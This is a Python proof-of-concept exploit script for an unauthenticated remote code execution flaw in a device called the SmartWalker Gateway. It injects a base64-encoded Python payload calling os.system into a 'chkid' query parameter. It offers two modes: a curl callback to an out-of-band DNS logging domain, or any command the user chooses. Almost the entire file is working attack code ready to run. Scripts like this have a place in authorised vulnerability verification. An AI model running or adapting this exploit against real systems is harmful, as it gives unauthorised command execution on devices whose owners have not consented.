#!/usr/bin/env python3
"""
POC for SmartWalker Gateway Unauthenticated RCE (Corrected Payload & Params).

Usage:
    # Default: Execute a curl command to trigger a DNS log callback
    python3 poc_final.py -u https://<target_ip> -d <your_dnslog_domain>
    python3 poc_final.py -u https://192.168.1.100 -d test.oastify.com

    # Custom command: Execute a specific command on the target
    python3 poc_final.py -u https://<target_ip> -c "id"
    python3 poc_final.py -u https://192.168.1.100 -c "whoami"
"""
import argparse
import base64
import requests
import urllib3

# Disable insecure request warnings (for HTTPS with self-signed certs)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(target_url, dnslog_domain=None, custom_cmd=None):
    """
    Exploits the RCE vulnerability with the corrected payload format and parameters.

    Args:
        target_url (str): The base URL of the target gateway (e.g., https://1.2.3.4).
        dnslog_domain (str, optional): The DNS log domain to trigger (e.g., test.oastify.com).
        custom_cmd (str, optional): The custom command to execute (e.g., 'id', 'whoami').
    """
    if dnslog_domain:
        # Construct the malicious payload string in the new format
        raw_payload = f"{{'sUserCode': __import__('os').system('curl {dnslog_domain}'), 'sPwd': 0}}"
        print(f"[INFO] Raw payload string: {raw_payload}")
    elif custom_cmd:
        raw_payload = f"{{'sUserCode': __import__('os').system('{custom_cmd}'), 'sPwd': 0}}"
        print(f"[INFO] Raw payload string: {raw_payload}")
    else:
        print("[ERROR] No action specified. Provide either -d for DNS log or -c for a custom command.")
        return

    # Base64 encode the raw payload string
    encoded_payload = base64.b64encode(raw_payload.encode('utf-8')).decode('utf-8')
    print(f"[INFO] Encoded payload (chkid value): {encoded_payload}")

    # Construct the target endpoint - sending to root path '/'
    url = f"{target_url.strip('/')}/" # Ensure the URL ends with /
    params = {
        'title': '1',
        'oIp': '1', # Use the correct parameter name 'oIp'
        'chkid': encoded_payload
    }

    print(f"[INFO] Sending request to: {url}")
    print(f"[INFO] Parameters: {params}")

    try:
        # Send the GET request with the malicious payload
        response = requests.get(url, params=params, verify=False, timeout=10)
        print(f"[INFO] HTTP Response Code: {response.status_code}")
        
        if dnslog_domain:
            print(f"[INFO] If vulnerable, check your DNS log ({dnslog_domain}) for a callback from the target.")
        elif custom_cmd:
             print(f"[INFO] Custom command '{custom_cmd}' was sent. The target may have executed it, but output is not returned here.")
        # Optionally print a snippet of the response if needed for debugging
        # print(f"[DEBUG] Response snippet: {response.text[:200]}...")

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] An error occurred during the request: {e}")

def main():
    parser = argparse.ArgumentParser(description="POC for SmartWalker Gateway Unauthenticated RCE (Corrected Params)")
    
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-d", "--dnslog-domain", help="DNS log domain to trigger (e.g., test.oastify.com)")
    group.add_argument("-c", "--command", help="Custom command to execute (e.g., 'id', 'whoami')")
    
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., https://192.168.1.100)")

    args = parser.parse_args()

    exploit(args.url, dnslog_domain=args.dnslog_domain, custom_cmd=args.command)

if __name__ == "__main__":
    main()
